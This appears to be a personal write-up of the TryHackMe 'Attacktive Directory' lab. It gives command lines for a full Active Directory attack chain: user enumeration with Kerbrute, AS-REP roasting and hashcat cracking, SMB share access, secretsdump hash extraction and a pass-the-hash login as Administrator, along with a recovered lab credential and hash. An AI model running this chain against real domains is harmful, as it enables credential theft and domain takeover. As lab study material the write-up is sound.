---
title: THM Attacktive Directory
author: Yuchao
date: 2022-05-18 11:33:00 +0800
categories: [sec]
tags: [ActiveDirectory]
math: true
mermaid: true
---

# install Impacket

- <https://github.com/SecureAuthCorp/impacket>

```
git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
pip3 install -r /opt/impacket/requirements.txt
cd /opt/impacket/ && python3 ./setup.py install
```

# Installing Bloodhound and Neo4j

- <https://github.com/BloodHoundAD/BloodHound>
- <https://github.com/neo4j>

```
apt install bloodhound neo4j
```

# nmap
```
nmap -sC -sV -oA nmap.out 10.10.222.186
```

# Kerbrute
- based on Impacket

Enumerate users
```
./kerbrute_linux_amd64 userenum  -d spookysec.local --dc 10.10.156.79  /home/kali/Desktop/userlist.txt  
```

# GetNPUsers.py
- an Impacket tool
- ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. 

```
python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/svc-admin
```

find hash type
- <https://hashcat.net/wiki/doku.php?id=example_hashes>

bruteforce hash
```
hashcat -m 18200 ./svcHash /home/kali/Desktop/passwordlist.txt  --force
```

# smbclient

list shares
```
smbclient --user svc-admin -L 10.10.30.17
```

connect to one share named "backup"
```
smbclient //10.10.30.17/backup --user svc-admin
```


backup@spookysec.local:backup2517860

# secretsdump.py
understanding windows hash
- <https://hunter2.gitbook.io/darthsidious/getting-started/intro-to-windows-hashes>

```
python3 secretsdump.py  backup@10.10.30.17 -just-dc
```

# pass the hash attack
- <https://www.beyondtrust.com/resources/glossary/pass-the-hash-pth-attack>

evil-winrm login
```
evil-winrm -i 10.10.30.17 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```
